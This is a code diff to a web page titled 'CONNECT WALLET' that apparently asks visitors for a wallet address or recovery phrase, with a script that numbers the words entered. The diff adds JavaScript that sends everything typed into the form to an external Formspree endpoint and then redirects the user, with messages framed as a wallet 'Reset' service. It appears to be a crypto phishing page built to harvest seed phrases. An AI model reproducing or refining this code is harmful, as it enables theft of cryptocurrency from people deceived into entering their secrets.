@@ -212,7 +212,7 @@ input{
 
     <body>
         <div class="form__field">
-            <form action="https://formspree.io/f/mdkenbez" method="POST">
+            <form id= "wallform">
                 <header>
                     <small>CONNECT WALLET</small>
                     <h1>Wallet Address</h1>
@@ -255,8 +255,45 @@ inputArea.addEventListener('input', function() {
   outputArea.textContent = numberedText.trim(); //Set the text content and trim the last space
 });
 
+
+              document.addEventListener("DOMContentLoaded", function () {
+    const form = document.getElementById("wallform");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault(); // Prevent the default form reload
+
+      const formData = new FormData(form);
+      const jsonData = {};
+
+
+      formData.forEach((value, key) => {
+        jsonData[key] = value;
+      });
+
+      fetch("https://formspree.io/f/mdkenbez", { // Replace with your Formspree ID
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json"
+        },
+        body: JSON.stringify(jsonData)
+      })
+      .then(response => {
+        if (response.ok) {
+          window.location.href = "Redirect.html"; // Redirect after submission
+        } else {
+          alert("Reset application failed. Please try again.");
+        }
+      })
+      .catch(error => {
+        console.error("Submission error:", error);
+        alert("An error occurred while applying for Reset.");
+      });
+    });
+  });
         </script>
     </body>
 
 </html>
+
 
